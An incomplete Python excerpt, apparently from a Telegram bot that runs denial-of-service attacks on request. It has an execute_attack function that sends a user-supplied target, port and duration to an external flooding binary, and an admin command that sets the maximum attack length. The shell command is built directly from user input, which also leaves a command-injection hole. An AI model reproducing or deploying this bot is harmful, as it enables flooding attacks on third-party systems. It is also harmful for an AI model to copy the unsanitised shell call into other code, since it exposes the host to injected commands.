...
MAX_ATTACK_DURATION = 180  # default max attack duration in seconds
...
def execute_attack(message, target, port, time_duration, user_id, group_id):
    ...
    try:
        ...
        subprocess.run(f"./Ravi {target} {port} {time_duration} 1000", shell=True, check=True)
...
def set_max_attack_duration(message):
    user_id = str(message.from_user.id)
    ...
    try:
        ...
        send_attack_message(message.chat.id,
            f"╔════════════════════════════════╗\n"
            f"║ ✅ MAX DURATION UPDATED ✅ ║\n"
            f"╚════════════════════════════════╝\n\n"
            f"🔹 New max attack time: <code>{new_duration} seconds</code>\n"
            f"🔸 All future attacks must be under this limit")
    except (IndexError, ValueError):
        send_attack_message(message.chat.id,
            "╔════════════════════════════════╗\n"
            "║ ⚠️ INVALID FORMAT ⚠️ ║\n"
            "╚════════════════════════════════╝\n\n"
            "🔹 Usage: <code>/setmaxduration &lt;seconds&gt;</code>\n"
            "🔸 Example: <code>/setmaxduration 120</code>")
